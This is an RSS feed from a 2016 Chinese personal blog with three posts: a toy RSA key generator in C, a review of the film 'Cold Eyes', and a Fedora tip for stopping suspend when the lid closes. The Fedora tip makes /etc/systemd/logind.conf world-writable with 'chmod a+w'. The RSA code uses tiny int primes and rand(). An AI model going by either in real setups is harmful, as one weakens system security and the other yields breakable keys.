<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>BLOG|LEXUGE</title>
    <description>This is a personal website.It is LEXUGE's BLOG.Welcome to my website!
</description>
    <link>http://example.com/</link>
    <atom:link href="http://example.com/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 01 Oct 2016 13:28:01 +0800</pubDate>
    <lastBuildDate>Sat, 01 Oct 2016 13:28:01 +0800</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>RSA密钥生成（C语言）</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。
RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。
今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。
RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;下面是代码实现&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RSA tool&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;please input two prime number:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;number(s) is(are) not the prime number!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(E,N)=(%d,%d)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(D,N)=(%d,%d)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Sat, 01 Oct 2016 09:43:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/10/01/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90-C%E8%AF%AD%E8%A8%80.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/10/01/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90-C%E8%AF%AD%E8%A8%80.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>《监视者》影评</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;《监视者们》翻拍自香港电影《跟踪》，是由赵义硕，金秉瑞联合执导，薛景求，郑雨盛，韩孝珠，李俊昊等主演的动作剧情片。&lt;br /&gt;
该片描写了隐蔽真实身份的监视专家们与每次受到危机四伏的追踪却都能幸运逃脱的秘密犯罪者之间惊心动魄的对决。以监视特定对象的警察内部特殊组织部门监视班为背景，讲述特殊犯罪科监视班队员与银行盗窃团伙之间发生的故事。于2013年7月3日在韩国上映，票房突破550万，并受邀参展多伦多国际电影节。2014年9月16日在中国大陆上映，并更名为《绝密跟踪》。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;       影片的剧情可谓是非常刺激的。开篇，就是黄组长对“花猪”的考验，使得整部片子的节奏感特别强。记忆力超群的“花猪”成功经受住了黄组长的考量——快速回忆了地铁上黄组长经历与周围发生的一切细节。事实上，这让我想到了丢东西后瞬时对脑海中所有场景的回忆。回忆之快，超乎想象。&lt;br /&gt;
       “注意力错觉，也叫非注意盲视。人们通常只会记住自己所关注的东西，你看到了地铁里的一切，但是你只记住了你关注的东西“。生活中我们总会忽视、忘记什么。大脑是选择性记忆的，这就是因为我们并没有关注而导致忘记。&lt;br /&gt;
       追踪影子的那一段是异常精彩的。&lt;br /&gt;
       “影子”正准备第二次洗劫银行。穿着风衣，手提卡其色公文包，低头匆匆走向交易所。黄组长在交易所附近的街道上不断搜查嫌疑人。他扫视到了“影子”，敏锐的职业习惯让他多加注意了几眼这个行色匆匆的人。随后，“花猪”上了的士，但一上车就脱去了紫色羽绒大衣，整换了头型——作为一个行事有道的惯犯，这一反常举动引起了“影子”冥冥之中的注意。很快，“影子”登上了交易所的顶楼——站在至高点指挥全盘犯罪计划。正当他用高倍单筒望远镜扫视四周时，又发现了那位反常的女子——“花猪”——她又换了一套外衣，改变了头饰与发型——更为反常的是，她的上下车地点仅相隔几步之遥。任何人都不会用这种方式打的士，“影子”想到，这正是警方惯用的搜查方式。最后一个举动，使“影子”肯定了，她，就是警察——“花猪”跟随“影子”同伙的车辆跑去。&lt;br /&gt;
       这一段的情节紧凑连贯，细节缜密，小说意味极强，也是整部电影中极其精彩的一段。原片对这一段的节奏感控制的很恰当，很详细的描写出了“影子”当时的眼神。从而刻画出了人物心理，而并不是像国内二三流电视剧，滥用心理独白。&lt;br /&gt;
       事实上，这篇电影中有很多的黑客元素（不关于技术方面）。可以说，黑客在理想化状态中就是如同“影子”般冷漠、冷酷、冷静的，计划缜密，天衣无缝。从另一种角度来解析，也有另一层含义——不要相信自己以外的任何人。&lt;br /&gt;
       &lt;strong&gt;人们通常只会记住自己所关注的东西，去发现别人注意与不注意的一切————你，就是上帝。&lt;/strong&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 30 Sep 2016 19:29:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/09/30/%E7%9B%91%E8%A7%86%E8%80%85-%E5%BD%B1%E8%AF%84.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/09/30/%E7%9B%91%E8%A7%86%E8%80%85-%E5%BD%B1%E8%AF%84.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Fedora关闭合上笔记本屏幕挂起</title>
        <description>&lt;p&gt;与众多的Linux版本一样，因为内核的缘故，Fedora笔记本在合上屏幕时会自动挂起，很有可能无法唤醒。&lt;br /&gt;
如何解决这个问题呢？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;我们需要编辑&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/systemd/logind.conf&lt;/code&gt;这个配置文件，但是它属于系统文件，所以是只读的，我们要执行以下命令：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod a+w /etc/systemd/logind.conf
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;这样我们就有了更改配置文件的权限&lt;/li&gt;
  &lt;li&gt;接下来我们打开并编辑它
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim /etc/systemd/logind.conf
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;找到关键字 HandleLidSwitch 将其值改为 ignore。并把本行头的注释去掉：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HandleLidSwitch=ignore
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;reboot&lt;br /&gt;
OK，这个问题就完美解决了!&lt;br /&gt;
PS:资源下载已搬迁至about页面&lt;/p&gt;
</description>
        <pubDate>Fri, 23 Sep 2016 17:38:00 +0800</pubDate>
